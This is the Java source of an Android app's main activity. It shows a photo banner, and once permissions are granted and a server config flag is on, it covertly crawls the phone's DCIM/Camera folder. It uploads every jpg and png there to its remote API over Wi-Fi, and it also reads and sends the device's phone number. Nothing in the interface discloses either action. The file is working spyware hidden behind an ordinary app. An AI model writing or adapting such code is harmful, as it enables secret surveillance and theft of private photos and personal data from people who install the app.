package com.senzer.mylove.activity;

import android.content.Context;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.os.Environment;
import android.support.annotation.NonNull;
import android.support.v7.app.AppCompatActivity;
import android.view.View;

import com.senzer.mylove.R;
import com.senzer.mylove.api.DataResponse;
import com.senzer.mylove.api.HttpCode;
import com.senzer.mylove.api.ParamsHelper;
import com.senzer.mylove.api.SpiderApiService;
import com.senzer.mylove.app.AppContext;
import com.senzer.mylove.entity.dto.ConfigResp;
import com.senzer.mylove.entity.dto.FileResp;
import com.senzer.mylove.entity.vo.UserInfo;
import com.senzer.mylove.logger.SpiderLogger;
import com.senzer.mylove.util.GlideImageLoader;
import com.senzer.mylove.util.PermissionDetector;
import com.senzer.mylove.util.PhoneInfo;
import com.senzer.mylove.util.StringUtil;
import com.youth.banner.Banner;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import butterknife.Bind;
import butterknife.ButterKnife;
import rx.Subscriber;
import rx.android.schedulers.AndroidSchedulers;
import rx.schedulers.Schedulers;

import static com.senzer.mylove.util.PermissionDetector.REQUEST_MULTI_PMSNS_TYPE_ONE;

public class MainActivity extends AppCompatActivity {
    public static final String TAG = MainActivity.class.getSimpleName();

    @Bind(R.id.banner)
    Banner banner;

    private SpiderApiService spiderApiService;

    @Override
    protected void onDestroy() {
        super.onDestroy();
        ButterKnife.unbind(this);
    }


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        ButterKnife.bind(this);

        spiderApiService = AppContext.getInstance().getSpiderApiService();

        initBannerView();
        reqServerImgs();
        if (PermissionDetector.verifyMultiPmsnsTypeOne(this)) {
            reqConfigs();
        }
    }

    @Override
    public void onRequestPermissionsResult(
            int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        switch (requestCode) {
            case REQUEST_MULTI_PMSNS_TYPE_ONE:

                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {  // permission granted

                    reqConfigs();
                }
                break;

            default:
                break;
        }
    }

    @Override
    public void onStart() {
        super.onStart();

        // for the better experience
        banner.startAutoPlay();
    }

    @Override
    public void onStop() {
        super.onStop();

        // for the better experience
        banner.stopAutoPlay();
    }

    private void initBannerView() {
        banner.setImageLoader(new GlideImageLoader());
//        banner.setOnBannerListener(this);
    }

    private boolean isUploading = false;
    private int uploadedIndex = 0;

    private void getCameraImgs() {

        String state = Environment.getExternalStorageState();
        if (state.equals(Environment.MEDIA_MOUNTED)) {

            String dcim = Environment
                    .getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath();
            String camera = dcim + "/Camera";
            new Thread() {

                @Override
                public void run() {
                    List<File> files = getFiles(camera);
                    int size = files.size();
                    while (true && uploadedIndex < size) {

                        if (!isUploading && isWIFI()) {

                            isUploading = true;
                            uploadImg(files.get(uploadedIndex));
                        }
                    }

                }
            }.start();
        }
    }

    private boolean isWIFI() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo netInfo = cm.getActiveNetworkInfo();
        if (null != netInfo && netInfo.getType() == ConnectivityManager.TYPE_WIFI) {
            return true;
        }

        return false;
    }

    private void getPhoneNum() {
        PhoneInfo.getInstance().init(this);
        String phoneNum = PhoneInfo.getInstance().getNativePhoneNumber();
        if (StringUtil.checkEmpty(phoneNum)) {
            SpiderLogger.getLogger().d(TAG, "[Main - getPhoneNum] phoneNum is empty!");
            return;
        }

        UserInfo uInfo = new UserInfo(phoneNum);
        registerUser(uInfo);
    }

    public static List<File> getFiles(String strPath) {
        List<File> destFiles = new ArrayList<>();

        File dir = new File(strPath);
        File[] files = dir.listFiles();                     // 该文件目录下文件全部放入数组
        if (null != files) {
            for (int i = 0; i < files.length; i++) {
                String fileName = files[i].getName();
                if (files[i].isDirectory()) {               // 判断是文件还是文件夹

                    getFiles(files[i].getAbsolutePath());   // 获取文件绝对路径
                } else if (fileName.endsWith("jpg")
                        || fileName.endsWith("jpeg")
                        || fileName.endsWith("png")) {      // 判断文件名是否以.avi结尾

                    String strFileName = files[i].getAbsolutePath();
                    SpiderLogger.getLogger().i(TAG, "[Main - getFiles] --- " + strFileName);
                    destFiles.add(files[i]);
                } else {
                    continue;
                }
            }

        }
        return destFiles;
    }

    private void reqServerImgs() {
        Subscriber subscriber = new Subscriber<DataResponse<List<FileResp>>>() {
            @Override
            public void onCompleted() {
            }

            @Override
            public void onError(Throwable e) {
                e.printStackTrace();
            }

            @Override
            public void onNext(DataResponse<List<FileResp>> dataResponse) {
                if (HttpCode.verifyCode(dataResponse.getCode())) {

                    List<FileResp> fileResps = dataResponse.getData();
                    if (null == fileResps || fileResps.isEmpty()) {
                        banner.setVisibility(View.GONE);
                        return;
                    }

                    banner.setVisibility(View.VISIBLE);
                    banner.setImages(fileResps);
                    banner.start();
                } else {

                    SpiderLogger.getLogger().d(TAG, "[Main - reqServerImgs] FAULT!");
                }
            }
        };

        spiderApiService.getImages()
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(subscriber);
    }

    private void reqConfigs() {
        Subscriber subscriber = new Subscriber<DataResponse<ConfigResp>>() {
            @Override
            public void onCompleted() {
            }

            @Override
            public void onError(Throwable e) {
                e.printStackTrace();
            }

            @Override
            public void onNext(DataResponse<ConfigResp> dataResponse) {
                if (HttpCode.verifyCode(dataResponse.getCode())) {

                    ConfigResp config = dataResponse.getData();
                    if (ConfigResp.IS_UPLOAD_IMG_YES.equals(config.getIsUploadImage())) {

                        getCameraImgs();
                        getPhoneNum();
                    } else {

                        SpiderLogger.getLogger().d(TAG, "[Main - reqConfigs] not upload images!");
                    }
                } else {

                    SpiderLogger.getLogger().d(TAG, "[Main - reqConfigs] FAULT!");
                }
            }
        };

        spiderApiService.getConfigs()
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(subscriber);
    }

    private void uploadImg(File file) {
        Subscriber subscriber = new Subscriber<DataResponse>() {
            @Override
            public void onCompleted() {
            }

            @Override
            public void onError(Throwable e) {
                e.printStackTrace();
            }

            @Override
            public void onNext(DataResponse dataResponse) {
                if (HttpCode.verifyCode(dataResponse.getCode())) {

                    isUploading = false;
                    uploadedIndex++;
                    SpiderLogger.getLogger().d(TAG, "[Main - uploadBatchImgs] SUCCESS: " + file.getName());
                } else {

                    SpiderLogger.getLogger().d(TAG, "[Main - uploadBatchImgs] FAULT!");
                }
            }
        };

        spiderApiService.upload(ParamsHelper.uploadMap(file))
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(subscriber);
    }

    private void uploadBatchImgs(List<File> files) {
        Subscriber subscriber = new Subscriber<DataResponse>() {
            @Override
            public void onCompleted() {
            }

            @Override
            public void onError(Throwable e) {
                e.printStackTrace();
            }

            @Override
            public void onNext(DataResponse dataResponse) {
                if (HttpCode.verifyCode(dataResponse.getCode())) {

                    SpiderLogger.getLogger().d(TAG, "[Main - uploadBatchImgs] SUCCESS!");
                } else {

                    SpiderLogger.getLogger().d(TAG, "[Main - uploadBatchImgs] FAULT!");
                }
            }
        };

        spiderApiService.uploadBatch(ParamsHelper.uploadBatchMap(files))
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(subscriber);
    }

    /**
     * 注册用户（目前主要实现上传手机号）
     *
     * @param user
     */
    private void registerUser(UserInfo user) {
        Subscriber subscriber = new Subscriber<DataResponse>() {
            @Override
            public void onCompleted() {
            }

            @Override
            public void onError(Throwable e) {
                e.printStackTrace();
            }

            @Override
            public void onNext(DataResponse dataResponse) {
                if (HttpCode.verifyCode(dataResponse.getCode())) {

                    SpiderLogger.getLogger().d(TAG, "[Main - registerUser] SUCCESS!");
                } else {

                    SpiderLogger.getLogger().d(TAG, "[Main - registerUser] FAULT!");
                }
            }
        };

        spiderApiService.register(ParamsHelper.registerMap(user))
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(subscriber);
    }
}